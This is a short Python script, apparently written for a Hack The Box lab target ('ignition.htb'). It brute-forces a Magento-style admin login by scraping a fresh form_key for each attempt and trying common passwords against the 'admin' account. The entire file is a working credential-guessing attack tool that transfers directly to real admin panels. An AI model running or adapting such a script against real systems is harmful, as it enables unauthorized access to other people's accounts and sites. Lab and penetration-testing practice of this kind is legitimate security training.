#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import sys

def extract_form_key(session, url):
    """Extract form_key from the admin login page"""
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    form_key = soup.find('input', {'name': 'form_key'})
    if form_key:
        return form_key.get('value')
    return None

def try_login(username, password, url):
    """Attempt login with dynamic form_key"""
    session = requests.Session()
    
    # Get form_key from login page
    form_key = extract_form_key(session, url)
    if not form_key:
        print(f"[-] Could not extract form_key")
        return False
    
    # Prepare payload
    payload = {
        'form_key': form_key,
        'login[username]': username,
        'login[password]': password
    }
    
    # Send login attempt
    response = session.post(url, data=payload)
    
    # Check for error string (you need to find this in Burp)
    if "Invalid" in response.text or "sign in correctly" in response.text:
        print(f"[-] Failed: {username}:{password}")
        return False
    elif "dashboard" in response.text.lower() or "logout" in response.text.lower():
        print(f"[+] SUCCESS: {username}:{password}")
        return True
    else:
        # Could be success or just different error
        print(f"[?] Unclear: {username}:{password} - check manually")
        return False

if __name__ == "__main__":
    url = "http://ignition.htb/admin"
    users = ["admin"]
    passwords = ["password", "123456", "admin", "retarded", "qwerty123"]
    
    for user in users:
        for passwd in passwords:
            try_login(user, passwd, url)
